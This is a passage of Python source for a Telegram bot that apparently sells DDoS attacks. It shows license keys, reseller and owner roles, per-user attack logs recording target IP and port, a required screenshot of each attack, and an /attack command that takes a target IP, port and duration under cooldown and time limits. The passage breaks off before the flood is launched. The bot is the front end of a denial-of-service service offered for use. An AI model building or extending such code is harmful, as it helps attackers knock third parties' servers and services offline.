        print(f"edit_caption err: {str(e)[:120]}")
        return None

# ============= START COMMAND =============
@bot.message_handler(commands=['start', 'help'])
def cmd_start(msg):
    react_to_message(msg)
    try:
        HEALTH["total_messages"] += 1
        if check_ban(msg): return
        uid = msg.from_user.id
        name = msg.from_user.first_name or "User"
        username = msg.from_user.username
        cid = msg.chat.id

        print(f"🚀 /start from {uid} (@{username}) | owner={is_owner(uid)}")

        # ★★★ BOX GROW FUNCTION ★★★
        def make_box(pct_num):
            if pct_num <= 0:
                top = "◢◤"; bottom = "◥◣"
            elif pct_num <= 10:
                top = "◢◤◢◤◢◤"; bottom = "◥◣◥◣◥◣"
            elif pct_num <= 30:
                top = "◢◤◢◤◢◤◢◤◢◤"; bottom = "◥◣◥◣◥◣◥◣◥◣"
            elif pct_num <= 50:
                top = "◢◤◢◤◢◤◢◤◢◤◢◤◢◤"; bottom = "◥◣◥◣◥◣◥◣◥◣◥◣◥◣"
            elif pct_num <= 70:
                top = "◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤"; bottom = "◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣"
            elif pct_num <= 90:
                top = "◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤"; bottom = "◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣"
            else:
                top = "◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤"; bottom = "◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣◥◣"
            return top, bottom

        top, bottom = make_box(0)
        check_text = (
            f"{top}\n"
            "      ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡\n"
            f"{bottom}\n\n"
            "▱▱▱▱▱▱▱▱▱▱ 0%\n"
            "⏳ 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠..."
        )

        check = None
        is_video_msg = False
        chosen_pyf_start = get_random_pyf()
        if chosen_pyf_start:
            try:
                print(f"📹 Sending PYF video for /start...")
                check = bot.send_video(cid, chosen_pyf_start, caption=check_text, parse_mode="HTML")
                is_video_msg = True
                print(f"✅ PYF video sent successfully")
            except Exception as e:
                print(f"❌ PYF video send failed: {e}, falling back to text")
                try:
                    check = bot.send_message(cid, check_text, parse_mode="HTML")
                except Exception as e2:
                    print(f"❌ Even text send failed: {e2}")
                    return
        else:
            check = bot.send_message(cid, check_text, parse_mode="HTML")

        if not check:
            return

        steps = [
            ("▰▱▱▱▱▱▱▱▱▱", 10, "10%", "📡 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗼 𝘀𝗲𝗿𝘃𝗲𝗿..."),
            ("▰▰▰▱▱▱▱▱▱▱", 30, "30%", "👤 𝐕𝐞𝐫𝐢𝐟𝐲𝐢𝐧𝐠 𝐮𝐬𝐞𝐫..."),
            ("▰▰▰▰▰▱▱▱▱▱", 50, "50%", "⚙️ 𝙇𝙤𝙖𝙙𝙞𝙣𝙜 𝙥𝙧𝙤𝙛𝙞𝙡𝙚..."),
            ("▰▰▰▰▰▰▰▱▱▱", 70, "70%", "🔑 ᴄʜᴇᴄᴋɪɴɢ ᴋᴇʏ ꜱᴛᴀᴛᴜꜱ..."),
            ("▰▰▰▰▰▰▰▰▰▱", 90, "90%", "⏳ 𝘍𝘪𝘯𝘢𝘭𝘪𝘻𝘪𝘯𝘨..."),
            ("▰▰▰▰▰▰▰▰▰▰", 100, "100%", "✅ Ｖｅｒｉｆｉｅｄ!"),
        ]

        for bar, pct_num, pct, status in steps:
            time.sleep(0.3)
            top, bottom = make_box(pct_num)
            anim_text = (
                f"{top}\n"
                "      ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡\n"
                f"{bottom}\n\n"
                f"{bar} {pct}\n"
                f"{status}"
            )
            if is_video_msg:
                safe_edit_caption(cid, check.message_id, anim_text, parse_mode="HTML")
            else:
                safe_edit_text(cid, check.message_id, anim_text, parse_mode="HTML")

        # ═══════════════════════════════════════════════════
        # ★★★ COLLECT ALL USER DATA ★★★
        # ═══════════════════════════════════════════════════
        is_new = str(uid) not in ensure_dict(data.get("users", {}))
        if is_new:
            join_time = ist_now()
            data["users"][str(uid)] = {
                "username": username or name, "first_name": name,
                "joined_at": join_time.isoformat(),
                "joined_ist": join_time.strftime('%d %b %Y, %I:%M:%S %p'),
                "total_attacks": 0, "key_expiry": None,
                "key_activated": None
            }
            save_data(data)

        state = key_state(uid)
        has_key = state in ("owner", "reseller", "active")
        u = ensure_dict(data.get("users", {})).get(str(uid), {})
        if not isinstance(u, dict): u = {}

        # Role
        if is_owner(uid):
            role = "🧛 𝗩𝗔𝗠𝗣𝗜𝗥𝗘 𝗞𝗜𝗡𝗚"
        elif is_reseller(uid):
            role = "🦇 𝗩𝗔𝗠𝗣𝗜𝗥𝗘 𝗟𝗢𝗥𝗗"
        else:
            role = "🧟 𝗡𝗘𝗪 𝗕𝗟𝗢𝗢𝗗"

        # ★★★ CLICKABLE NAME ★★★
        if username:
            clickable_name = f'<a href="https://t.me/{escape_html(username)}">{escape_html(name)}</a>'
        else:
            clickable_name = f'<a href="tg://user?id={uid}">{escape_html(name)}</a>'

        # Join date
        joined_date = "📈 ɴᴏ ᴅᴀᴛᴀ"
        if u.get('joined_ist'):
            joined_date = str(u['joined_ist']) + " IST"
        elif u.get('joined_at'):
            jt = safe_parse_dt(u['joined_at'])
            if jt:
                joined_date = to_ist(jt).strftime('%d %b %Y, %I:%M:%S %p') + " IST"

        # Key activated
        activated_date = "🧿 ɴᴏ ᴋᴇʏ"
        if is_owner(uid) or is_reseller(uid):
            activated_date = "🦄 ᴜɴʟɪᴍɪᴛᴇᴅ"
        elif u.get("key_activated"):
            at = safe_parse_dt(u["key_activated"])
            if at:
                activated_date = to_ist(at).strftime('%d %b %Y, %I:%M:%S %p') + " IST"

        # Key expiry
        expiry_date = " 🛰️ ɴᴏ ᴋᴇʏ"
        if is_owner(uid) or is_reseller(uid):
            expiry_date = "🦄 ᴜɴʟɪᴍɪᴛᴇᴅ"
        elif u.get("key_expiry"):
            exp = safe_parse_dt(u["key_expiry"])
            if exp:
                expiry_date = to_ist(exp).strftime('%d %b %Y, %I:%M:%S %p') + " IST"

        # Time counter
        time_days = "00"; time_hours = "00"; time_minutes = "00"; time_seconds = "00"
        if is_owner(uid) or is_reseller(uid):
            time_days = time_hours = time_minutes = time_seconds = "📟"
        elif u.get("key_expiry"):
            exp = safe_parse_dt(u["key_expiry"])
            if exp:
                rem = exp - ist_now()
                total = max(0, int(rem.total_seconds()))
                time_days = f"{total // 86400:02d}"
                time_hours = f"{(total % 86400) // 3600:02d}"
                time_minutes = f"{(total % 3600) // 60:02d}"
                time_seconds = f"{total % 60:02d}"

        # Attack log
        total_attacks = safe_int(u.get('total_attacks', 0))
        last_attack_ip = "🎟️ ɴᴏ ᴀᴛᴛᴀᴄᴋ"
        last_attack_time = "   📟 ɴᴏ ᴀᴛᴛᴀᴄᴋ"
        logs = ensure_list(data.get("attack_logs", []))
        user_logs = [l for l in logs if str(l.get('user_id')) == str(uid)]
        if user_logs:
            last = user_logs[-1]
            last_attack_ip = f"{last.get('target','N/A')}:{last.get('port','N/A')}"
            lt = safe_parse_dt(last.get('timestamp'))
            if lt:
                last_attack_time = to_ist(lt).strftime('%d %b %Y, %I:%M:%S %p') + " IST"

        # ★★★ BOTTOM BOX — LAUNCH HOLD / ROCKET READY ★★★
        if has_key:
            bottom_box = (
                "▓▒░    ━━ 🚇 𝐑𝐎𝐂𝐊𝐄𝐓 𝐑𝐄𝐀𝐃𝐘 ━━    ░▒▓\n\n"
                "█▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄█\n"
                "█              ▸ Lᴀᴜɴᴄʜ Aᴜᴛʜᴏʀɪᴢᴇᴅ ◂             █\n"
                "█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█"
            )
        else:
            bottom_box = (
                "▓▒░     ━━ 🚇 𝐋𝐀𝐔𝐍𝐂𝐇 𝐇𝐎𝐋𝐃 ━━    ░▒▓\n\n"
                "█▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄█\n"
                "█                   ▸ Nᴏ Kᴇʏ Fᴏᴜɴᴅ ◂                  █\n"
                "█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█"
            )

        # ★★★ FINAL TEXT ★★★
        text = (
            "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n"
            f"┊         {BOT_NAME}         ┊\n"
            "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n\n"
            f"  🌼 ᴡᴇʟᴄᴏᴍᴇ ᴀɢᴇɴᴛ  ➪ {clickable_name}\n\n"
            "╭─ 𝗔𝗚𝗘𝗡𝗧 𝗜𝗡𝗙𝗢 \n"
            f"│  ▸ ᴛᴀɢ    ➜ {role}\n"
            f"│  ▸ ᴄᴏᴅᴇ   ➜ <code>{uid}</code>\n"
            f"│  ▸ ᴊᴏɪɴ   ➜ <code>{joined_date}</code>\n"
            "╰──────────────────────────╯\n\n"
            "╭─ 𝗘𝗡𝗖𝗥𝗬𝗣𝗧𝗘𝗗 𝗞𝗘𝗬 \n"
            f"│  ▸ ᴜɴʟᴏᴄᴋ ➜ <code>{activated_date}</code>\n"
            f"│  ▸ ᴇxᴘɪʀᴇ ➜ <code>{expiry_date}</code>\n"
            "╰──────────────────────────╯\n\n"
            "╭─ 𝗧𝗜𝗠𝗘 𝗖𝗢𝗨𝗡𝗧𝗘𝗥 \n"
            f"│  ▸ 📅 ᴅᴀʏꜱ   ➜ <b>{time_days}</b>\n"
            f"│  ▸ 🕐 ʜᴏᴜʀꜱ  ➜ <b>{time_hours}</b>\n"
            f"│  ▸ ⏱️ ᴍɪɴꜱ   ➜ <b>{time_minutes}</b>\n"
            f"│  ▸ ⚡ ꜱᴇᴄꜱ   ➜ <b>{time_seconds}</b>\n"
            "╰──────────────────────────╯\n\n"
            "╭─ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗢𝗚 \n"
            f"│  ▸ ᴛᴏᴛᴀʟ  ➜ <b>{total_attacks}</b>\n"
            f"│  ▸ ʟᴀꜱᴛ ɪᴘ ➜ <code>{last_attack_ip}</code>\n"
            f"│  ▸ ᴛɪᴍᴇ  ➜ <code>{last_attack_time}</code>\n"
            "╰──────────────────────────╯\n\n"
        )

        if not has_key:
            text += "🔑 ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ ➪ <code>/redeem ʏᴏᴜʀ-ᴋᴇʏ</code>\n"

        text += (
                "◢◣◢◣◢◣◢◣◢◣◢◣◢◣◢◣◢◣◢◣◢◣◢◣◢◣\n"
                "▓▓              /attack   ♯    /profile             ▓▓\n"
                "     ▓▓       /status    ⌬  /redeem        ▓▓\n"
                "◥◤◥◤◥◤◥◤◥◤◥◤◥◤◥◤◥◤◥◤◥◤◥◤◥◤\n\n\n"
                + bottom_box
        )

        # Check message delete
        try:
            bot.delete_message(cid, check.message_id)
        except:
            pass

        # Sticker — instant
        chosen_sticker = get_random_sticker()
        sticker_msg = None
        if chosen_sticker:
            try:
                print(f"🎨 Sending sticker for /start...")
                sticker_msg = bot.send_sticker(cid, chosen_sticker)
                print(f"✅ Sticker sent successfully — 5 sec dikhega")
            except Exception as e:
                print(f"❌ Sticker send failed: {e}")
                sticker_msg = None

        if is_new:
            def notify_owner():
                try:
                    join_time_display = data["users"][str(uid)].get("joined_ist", "N/A")
                    owner_notif = (
                        "╔══════════════════════════╗\n"
                        "║             🆕 𝗡𝗘𝗪 𝗨𝗦𝗘𝗥 𝗔𝗟𝗘𝗥𝗧 🪩           ║\n"
                        "╚══════════════════════════╝\n\n"
                        "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                        "┃               👤 𝗨𝗦𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 📋             ┃\n"
                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                        f"  ◆ 🆔 ᴜꜱᴇʀ ɪᴅ ➪ <code>{uid}</code>\n"
                        f"  ◆ 📛 ɴᴀᴍᴇ ➪ <b>{escape_html(name)}</b>\n"
                        f"  ◆ 🔗 ᴜꜱᴇʀɴᴀᴍᴇ ➪ @{escape_html(username or 'N/A')}\n"
                        f"  ◆ 📅 ᴊᴏɪɴᴇᴅ ➪ <code>{join_time_display} IST</code>\n"
                        f"  ◆ 👥 ᴛᴏᴛᴀʟ ➪ <b>{len(ensure_dict(data['users']))}</b>\n\n"
                        "╔══════════════════════════╗\n"
                        "║            ✴️ 𝗔𝗖𝗧𝗜𝗢𝗡 𝗕𝗨𝗧𝗧𝗢𝗡𝗦 🌠            ║\n"
                        "╚══════════════════════════╝"
                    )
                    kb = InlineKeyboardMarkup()
                    kb.row(
                        InlineKeyboardButton("🚫 𝐁𝐀𝐍 𝐔𝐒𝐄𝐑", callback_data=f"ban_{uid}"),
                        InlineKeyboardButton("🎁 𝐆𝐈𝐕𝐄 𝟏𝟓𝐌 𝐊𝐄𝐘", callback_data=f"give15m_{uid}")
                    )
                    bot.send_message(BOT_OWNER, owner_notif, reply_markup=kb, parse_mode="HTML")
                except Exception as e:
                    print(f"Owner notification error: {e}")
            threading.Thread(target=notify_owner, daemon=True).start()

        # ★★★ PROFILE PHOTO FETCH FUNCTION ★★★
        def get_user_profile_photo(user_id):
            try:
                photos = bot.get_user_profile_photos(user_id, limit=1)
                if photos and photos.total_count > 0:
                    file_id = photos.photos[0][-1].file_id
                    print(f"✅ Profile photo found: {file_id[:30]}...")
                    return file_id
                else:
                    print("⚠️ No profile photo found")
                    return None
            except Exception as e:
                print(f"⚠️ Profile photo error: {e}")
                return None

        # ★★★ Sticker 5 sec → Profile Photo + Final Message → 1.5 sec → delete ★★★
        def send_with_sticker():
            try:
                if sticker_msg:
                    time.sleep(5.0)
                    profile_photo = get_user_profile_photo(uid)
                    if profile_photo:
                        try:
                            bot.send_photo(
                                cid,
                                profile_photo,
                                caption=text,
                                parse_mode="HTML",
                                reply_markup=kb_main(uid)
                            )
                            print("✅ Final message sent with PROFILE PHOTO")
                        except Exception as photo_err:
                            print(f"❌ Photo send failed: {photo_err}, falling back to text")
                            safe_send(cid, text, reply_markup=kb_main(uid), parse_mode="HTML")
                    else:
                        safe_send(cid, text, reply_markup=kb_main(uid), parse_mode="HTML")
                        print("✅ Final message sent (text only)")

                    time.sleep(1.5)
                    try:
                        bot.delete_message(cid, sticker_msg.message_id)
                        print("🗑️ Sticker deleted successfully")
                    except Exception as del_err:
                        print(f"⚠️ Sticker delete failed: {del_err}")
                else:
                    profile_photo = get_user_profile_photo(uid)
                    if profile_photo:
                        try:
                            bot.send_photo(
                                cid,
                                profile_photo,
                                caption=text,
                                parse_mode="HTML",
                                reply_markup=kb_main(uid)
                            )
                            print("✅ Final message sent with PROFILE PHOTO")
                        except Exception as photo_err:
                            print(f"❌ Photo send failed: {photo_err}")
                            safe_send(cid, text, reply_markup=kb_main(uid), parse_mode="HTML")
                    else:
                        safe_send(cid, text, reply_markup=kb_main(uid), parse_mode="HTML")
            except Exception as e:
                print(f"send_with_sticker error: {e}")

        threading.Thread(target=send_with_sticker, daemon=True).start()
    except Exception as e:
        HEALTH["total_errors"] += 1
        print(f"❌ cmd_start error: {e}")
        traceback.print_exc()
        
# ============= CALLBACKS =============
@bot.callback_query_handler(func=lambda call: call.data.startswith(("ban_", "give15m_", "fb_", "copykey_", "redeeminfo_")))
def handle_callbacks(call):
    try:
        # ★★★ COPY KEY BUTTON HANDLER ★★★
        if call.data.startswith("copykey_"):
            try:
                key = call.data.replace("copykey_", "", 1)
                bot.answer_callback_query(
                    call.id,
                    f"🔑 KEY ➪\n\n{key}\n\n🔺 LᴏɴG PʀEsS KʀᴋE KᴇY CᴏᴘY KʀᴏW 🔺",
                    show_alert=True
                )
            except Exception as e:
                print(f"Copy key callback error: {e}")
            return

        # ★★★ REDEEM INFO BUTTON HANDLER ★★★
        if call.data.startswith("redeeminfo_"):
            try:
                key = call.data.replace("redeeminfo_", "", 1)
                bot.answer_callback_query(
                    call.id,
                    f"📌 RᴇDᴇᴇM CᴏᴍMᴀNᴅ ➪\n\n/redeem {key}\n\n🔺 Yᴇ CᴏᴍMᴀɴD CᴏᴘY KʀᴋE BᴏT MᴀI BʜᴇJᴏ 🔺",
                    show_alert=True
                )
            except Exception as e:
                print(f"Redeem info callback error: {e}")
            return

        # ★★★ FEEDBACK HANDLER ★★★
        if call.data.startswith("fb_"):
            try:
                uid = call.from_user.id
                parts = call.data.split("_", 2)
                if len(parts) >= 3:
                    rating = parts[1]
                    fb_text = parts[2].replace("|", " ")

                    feedback_id = generate_feedback_id()
                    fb_entry = {
                        "id": feedback_id,
                        "user_id": uid,
                        "username": call.from_user.username or call.from_user.first_name or "User",
                        "rating": rating,
                        "text": fb_text,
                        "timestamp": ist_now().isoformat(),
                        "time_str": ist_full_str()
                    }
                    feedback_db["feedbacks"][feedback_id] = fb_entry
                    save_feedback_db(feedback_db)

                    data["feedbacks"].append(fb_entry)
                    if str(uid) in ensure_dict(data.get("pending_attacks", {})):
                        del data["pending_attacks"][str(uid)]
                    data["feedback_required"][str(uid)] = False
                    save_data(data)

                    try: bot.answer_callback_query(call.id, f"✅ Feedback ID: {feedback_id}", show_alert=True)
                    except: pass

                    try:
                        rating_icon = {"1": "⭐", "2": "⭐⭐", "3": "⭐⭐⭐", "4": "⭐⭐⭐⭐", "5": "⭐⭐⭐⭐⭐"}.get(rating, "⭐")
                        owner_fb = (
                            "╔══════════════════════════╗\n"
                            "║       📩 𝗡𝗘𝗪 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 📩          ║\n"
                            "╚══════════════════════════╝\n\n"
                            f"  ◆ 🆔 ꜰᴇᴇᴅʙᴀᴄᴋ ɪᴅ ➪ <code>{feedback_id}</code>\n"
                            f"  ◆ 👤 ᴜꜱᴇʀ ➪ <code>{uid}</code>\n"
                            f"  ◆ 🔗 @{escape_html(call.from_user.username or call.from_user.first_name or 'User')}\n"
                            f"  ◆ ⭐ ʀᴀᴛɪɴɢ ➪ {rating_icon}\n"
                            f"  ◆ 💬 ᴍꜱɢ ➪ <i>{escape_html(fb_text)}</i>\n"
                            f"  ◆ 📅 ᴛɪᴍᴇ ➪ <code>{ist_time_str()} IST</code>"
                        )
                        bot.send_message(BOT_OWNER, owner_fb, parse_mode="HTML")
                    except: pass

                    try:
                        bot.edit_message_text(
                            chat_id=call.message.chat.id,
                            message_id=call.message.message_id,
                            text=(
                                "╔══════════════════════════╗\n"
                                "║          📸 𝗨𝗣𝗟𝗢𝗔𝗗 𝗡𝗢𝗪 📸          ║\n"
                                "╚══════════════════════════╝\n\n"
                                "  ⚠️ <b>ᴀᴀᴘ ᴇꜱ ᴀᴛᴛᴀᴄᴋ ᴋᴀ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ʙʜᴇᴊᴇ</b>\n"
                                "  📌 <b>ᴛᴀʙʜɪ ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ ʟᴀɢᴀ ꜱᴀᴋᴛᴇ ʜᴏ</b>\n\n"
                                f"  ◆ 🆔 ꜰᴇᴇᴅʙᴀᴄᴋ ɪᴅ ➪ <code>{feedback_id}</code>\n"
                                f"  ◆ ⭐ ʀᴀᴛɪɴɢ ➪ <b>{rating}</b>/5\n\n"
                                "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                                "  📸 <b>ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ʙʜᴇᴊᴏ ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ ᴋᴇ ʟɪʏᴇ</b>"
                            ), parse_mode="HTML", reply_markup=None
                        )
                    except: pass
            except Exception as e:
                print(f"Feedback callback error: {e}")
            return

        # ★★★ OWNER CHECK — Ban/Give15m ke liye ★★★
        if not is_owner(call.from_user.id):
            try: bot.answer_callback_query(call.id, "🚫 BᴏT FᴀTʜᴇR OɴʟY!", show_alert=True)
            except: pass
            return

        data_parts = call.data.split("_", 1)
        action = data_parts[0]
        target_uid = data_parts[1] if len(data_parts) > 1 else None

        if not target_uid:
            try: bot.answer_callback_query(call.id, "❌ IɴVᴀʟɪD")
            except: pass
            return

        if action == "ban":
            target_uid_str = str(target_uid)
            if target_uid_str in ensure_dict(data.get("banned_users", {})):
                try: bot.answer_callback_query(call.id, "⚠️ AʟRᴇᴀDʏ BᴀNᴇD!", show_alert=True)
                except: pass
                return

            data["banned_users"][target_uid_str] = {
                "banned_at": ist_now().isoformat(),
                "banned_by": call.from_user.id,
                "reason": "ʙᴀɴɴᴇᴅ ʙʏ ᴏᴡɴᴇʀ"
            }
            save_data(data)

            try:
                ban_notif = (
                    "╔══════════════════════════╗\n"
                    "║             🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗 🚫           ║\n"
                    "╚══════════════════════════╝\n\n"
                    "  ⛔ <b>ᴀᴀᴘᴋᴏ ɪꜱ ʙᴏᴛ ꜱᴇ ʙᴀɴ ᴋᴀʀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ</b>\n\n"
                    f"  ◆ 📅 ᴛɪᴍᴇ ➪ <code>{ist_time_str()} IST</code>\n\n"
                    f"  👑 <b>ᴏᴡɴᴇʀ ɪᴅ:</b> <code>{BOT_OWNER}</code>"
                )
                bot.send_message(int(target_uid), ban_notif, parse_mode="HTML", reply_markup=dev_btn_kb())
            except Exception as e: print(f"Ban notif error: {e}")

            try: bot.answer_callback_query(call.id, f"🧟 UsᴇR {target_uid} BᴀNɴᴇD SᴜᴄᴄEssFᴜLʟY!", show_alert=True)
            except: pass

        elif action == "give15m":
            rp = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            new_key = f"BSC-{rp[:4]}-{rp[4:8]}"
            data["keys"][new_key] = {
                "seconds": 900, "duration_text": "15 ᴍɪɴᴜᴛᴇꜱ",
                "created_at": ist_now().isoformat(),
                "used": False, "used_by": None,
                "generated_for": str(target_uid)
            }
            save_data(data)

            key_notif = (
                "╔══════════════════════════╗\n"
                "║                🎁 𝗬𝗢𝗨 𝗚𝗢𝗧 𝗔 𝗞𝗘𝗬 🌵            ║\n"
                "╚══════════════════════════╝\n\n"
                "💎 <b>ᴀᴀᴘᴋᴏ ᴏᴡɴᴇʀ ꜱᴇ 15 ᴍɪɴᴜᴛᴇꜱ ᴋᴀ ᴋᴇʏ ᴍɪʟᴀ ʜᴀɪ!</b>\n\n"
                "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  ◆ 🔑 ᴋᴇʏ ➪ <code>{new_key}</code>\n"
                f"  ◆ ⏰ ᴅᴜʀᴀᴛɪᴏɴ ➪ <b>15 ᴍɪɴᴜᴛᴇꜱ</b>\n"
                "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"  ➤ <code>/redeem {new_key}</code>\n\n"
                "╔══════════════════════════╗\n"
                "║             ☣️ 𝗥𝗘𝗗𝗘𝗘𝗠 𝗡𝗢𝗪 🌼                  ║\n"
                "╚══════════════════════════╝"
            )
            try: bot.send_message(int(target_uid), key_notif, parse_mode="HTML")
            except Exception as e: print(f"Key notif error: {e}")

            try: bot.answer_callback_query(call.id, f"🍓 15ᴍ KᴇY SᴇNᴛ SᴜᴄᴄEssFᴜLʟY!", show_alert=True)
            except: pass

    except Exception as e:
        HEALTH["total_errors"] += 1
        print(f"Callback error: {e}")
        traceback.print_exc()
        try: bot.answer_callback_query(call.id, f"❌ Eʀʀᴏʀ", show_alert=True)
        except: pass
            
# ============= ATTACK =============
@bot.message_handler(commands=['attack'])
def cmd_attack(msg):
    react_to_message(msg)
    try:
        HEALTH["total_messages"] += 1
        HEALTH["total_commands"] += 1
        if check_ban(msg): return
        uid = msg.from_user.id
        cid = msg.chat.id

        if get_setting('maintenance_mode', False) and not is_owner(uid):
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║            🔧 𝗕𝗢𝗧 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 🔧         ║\n"
                "╚══════════════════════════╝\n\n"
                "  🔧 <b>ʙᴏᴛ ᴀʙʜɪ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅ ᴍᴇ ʜᴀɪ</b>\n\n"
                f"  👑 <b>ᴏᴡɴᴇʀ:</b> <code>{BOT_OWNER}</code>",
                parse_mode="HTML", reply_markup=dev_btn_kb())
            return

        if not is_owner(uid) and not has_valid_key(uid):
            state = key_state(uid)
            if state == "expired":
                safe_reply(msg,
                    "╔══════════════════════════╗\n"
                    "║                 🧰 𝗞𝗘𝗬 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 📴                ║\n"
                    "╚══════════════════════════╝\n\n"
                    "  ⚠️ <b>ᴀᴀᴘᴋɪ ᴋᴇʏ ᴇxᴘɪʀᴇ ʜᴏ ᴄʜᴜᴋɪ ʜᴀɪ!</b>\n\n"
                    "  📌 <b>ɴᴀʏᴀ ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ:</b>\n"
                    "  ➤ <code>/redeem YOUR-KEY</code>",
                    parse_mode="HTML", reply_markup=dev_btn_kb())
            else:
                safe_reply(msg,
                    "╔══════════════════════════╗\n"
                    "║               🔋 𝗡𝗢 𝗞𝗘𝗬 𝗙𝗢𝗨𝗡𝗗 🪫              ║\n"
                    "╚══════════════════════════╝\n\n"
                    "  ⚠️ <b>ᴀᴀᴘᴋᴇ ᴘᴀᴀꜱ ᴋᴏɪ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ ɴᴀʜɪ ʜᴀɪ!</b>\n\n"
                    "  📌 <b>ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ ➪</b>\n"
                    "  ➤ <code>/redeem YOUR-KEY</code>",
                    parse_mode="HTML", reply_markup=dev_btn_kb())
            return

        if data.get("feedback_enabled", False) and not is_owner(uid):
            if str(uid) in ensure_dict(data.get("pending_attacks", {})):
                fb_prompt = (
                    "╔══════════════════════════╗\n"
                    "║             📸 𝗨𝗣𝗟𝗢𝗔𝗗 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 📸        ║\n"
                    "╚══════════════════════════╝\n\n"
                    "  ⚠️ <b>ᴀᴀᴘᴋᴏ ᴀɢʟᴇ ᴀᴛᴛᴀᴄᴋ ᴋᴇ ʟɪʏᴇ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ʙʜᴇᴊɴᴀ ʜᴏɢᴀ</b>\n\n"
                    "  📸 <b>ᴘɪᴄʜʟᴇ ᴀᴛᴛᴀᴄᴋ ᴋᴀ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ʙʜᴇᴊᴏ</b>\n"
                    "  📌 <b>ᴛᴀʙʜɪ ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ ʟᴀɢᴀ ꜱᴀᴋᴛᴇ ʜᴏ</b>"
                )
                safe_reply(msg, fb_prompt, parse_mode="HTML")
                return

        parts = msg.text.split()[1:]
        if len(parts) != 3:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║            👾 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗠𝗔𝗡𝗗  🎛️        ║\n"
                "╚══════════════════════════╝\n\n"
                "  ◆ 📌 <b>ᴜꜱᴀɢᴇ:</b>\n"
                "  <code>/attack 𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐈𝐌𝐄</code>\n\n"
                "  ◆ 📝 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
                "  <code>/attack 𝟏.𝟐.𝟑.𝟒 𝟖𝟎 𝟔𝟎</code>",
                parse_mode="HTML")
            return

        ip, ps, ds = parts
        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
            safe_reply(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ɪᴘ!</b>", parse_mode="HTML"); return

        try:
            port = int(ps); dur = int(ds)
            if not (1 <= port <= 65535): safe_reply(msg, "❌ ᴘᴏʀᴛ 1-65535!"); return
            if dur < 1: safe_reply(msg, "❌ ᴍɪɴ 1ꜱ!"); return
            if dur > get_setting('max_attack_time', 300) and not is_owner(uid):
                safe_reply(msg, f"❌ ᴍᴀx {get_setting('max_attack_time', 300)}ꜱ!"); return
        except:
            safe_reply(msg, "❌ ɪɴᴠᴀʟɪᴅ ᴘᴏʀᴛ/ᴛɪᴍᴇ!"); return

        # ★★★ COOLDOWN CHECK WITH LIVE COUNTDOWN ★★★
        cd = get_cd_remaining(uid)
        if cd > 0 and not is_owner(uid):
            try:
                cooldown_msg = bot.reply_to(msg,
                    "╔══════════════════════════╗\n"
                    "║            ☢️ 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 𝗔𝗖𝗧𝗜𝗩𝗘 🚧        ║\n"
                    "╚══════════════════════════╝\n\n"
                    f"  ◆ ⏳ ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{cd} ꜱᴇᴄᴏɴᴅꜱ</b>\n"
                    f"  ◆ 📅 ᴛɪᴍᴇ ➪ <code>{ist_time_str()} IST</code>\n\n"
